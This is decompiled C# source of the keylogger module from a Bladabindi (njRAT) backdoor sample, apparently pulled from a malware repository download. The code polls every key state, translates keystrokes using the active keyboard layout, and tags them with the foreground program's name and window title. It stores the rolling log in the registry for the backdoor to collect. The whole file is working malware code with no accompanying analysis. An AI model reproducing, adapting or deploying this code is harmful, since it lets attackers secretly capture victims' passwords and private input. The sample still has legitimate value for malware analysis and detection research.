// Decompiled with JetBrains decompiler
// Type: j.kl
// Assembly: j, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 440D20D0-0C7C-4E06-A1C0-A53BD164C422
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\Backdoor.MSIL.Bladabindi.p-d261f3a5a6b1dbedde2e566d010b71ce3bdb9162942945f8f701b6a3dffbc136.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace j
{
  public class kl
  {
    private int LastAV;
    private string LastAS;
    private Keys lastKey;
    public string Logs;
    public string vn;

    public kl()
    {
      this.lastKey = Keys.None;
      this.Logs = "";
      this.vn = "[kl]";
    }

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
      uint a,
      uint b,
      byte[] c,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder d,
      int e,
      uint f,
      IntPtr g);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] a);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint a, uint b);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetKeyboardLayout(int a);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetAsyncKeyState(int a);

    private string AV()
    {
      try
      {
        IntPtr foregroundWindow = OK.GetForegroundWindow();
        int b;
        kl.GetWindowThreadProcessId(foregroundWindow, ref b);
        Process processById = Process.GetProcessById(b);
        if (!(foregroundWindow.ToInt32() == this.LastAV & Operators.CompareString(this.LastAS, processById.MainWindowTitle, false) == 0 | processById.MainWindowTitle.Length == 0))
        {
          this.LastAV = foregroundWindow.ToInt32();
          this.LastAS = processById.MainWindowTitle;
          return "\r\n\u0001" + DateAndTime.Now.ToString("yy/MM/dd ") + processById.ProcessName + " " + this.LastAS + "\u0001\r\n";
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "";
    }

    private static string VKCodeToUnicode(uint a)
    {
      try
      {
        StringBuilder d = new StringBuilder();
        byte[] numArray = new byte[(int) byte.MaxValue];
        if (!kl.GetKeyboardState(numArray))
          return "";
        uint b = kl.MapVirtualKey(a, 0U);
        IntPtr foregroundWindow = OK.GetForegroundWindow();
        int num = 0;
        ref int local = ref num;
        IntPtr keyboardLayout = (IntPtr) kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(foregroundWindow, ref local));
        kl.ToUnicodeEx(a, b, numArray, d, 5, 0U, keyboardLayout);
        return d.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return ((Keys) checked ((int) a)).ToString();
    }

    private string Fix(Keys k)
    {
      bool flag = OK.F.Keyboard.ShiftKeyDown;
      if (OK.F.Keyboard.CapsLock)
        flag = !flag;
      string str;
      try
      {
        Keys keys = k;
        str = keys == Keys.Delete || keys == Keys.Back ? "[" + k.ToString() + "]" : (keys == Keys.LShiftKey || keys == Keys.RShiftKey || keys == Keys.Shift || keys == Keys.ShiftKey || keys == Keys.Control || keys == Keys.ControlKey || keys == Keys.RControlKey || keys == Keys.LControlKey || keys == Keys.Alt || keys == Keys.F1 || keys == Keys.F2 || keys == Keys.F3 || keys == Keys.F4 || keys == Keys.F5 || keys == Keys.F6 || keys == Keys.F7 || keys == Keys.F8 || keys == Keys.F9 || keys == Keys.F10 || keys == Keys.F11 || keys == Keys.F12 || keys == Keys.End ? "" : (keys != Keys.Space ? (keys == Keys.Return || keys == Keys.Return ? (!this.Logs.EndsWith("[ENTER]\r\n") ? "[ENTER]\r\n" : "") : (keys != Keys.Tab ? (!flag ? kl.VKCodeToUnicode(checked ((uint) k)) : kl.VKCodeToUnicode(checked ((uint) k)).ToUpper()) : "[TAP]\r\n")) : " "));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          str = Strings.ChrW((int) k).ToString().ToUpper();
          ProjectData.ClearProjectError();
        }
        else
        {
          str = Strings.ChrW((int) k).ToString().ToLower();
          ProjectData.ClearProjectError();
        }
      }
      return str;
    }

    public void WRK()
    {
      this.Logs = Conversions.ToString(OK.GTV(this.vn, (object) ""));
      try
      {
        int num1 = 0;
        while (true)
        {
          checked { ++num1; }
          int a = 0;
          do
          {
            if (kl.GetAsyncKeyState(a) == (short) -32767 & !OK.F.Keyboard.CtrlKeyDown)
            {
              Keys k = (Keys) a;
              string str = this.Fix(k);
              if (str.Length > 0)
              {
                this.Logs += this.AV();
                this.Logs += str;
              }
              this.lastKey = k;
            }
            checked { ++a; }
          }
          while (a <= (int) byte.MaxValue);
          if (num1 == 1000)
          {
            num1 = 0;
            int num2 = checked (Conversions.ToInteger("20") * 1024);
            if (this.Logs.Length > num2)
              this.Logs = this.Logs.Remove(0, checked (this.Logs.Length - num2));
            OK.STV(this.vn, (object) this.Logs, RegistryValueKind.String);
          }
          Thread.Sleep(1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
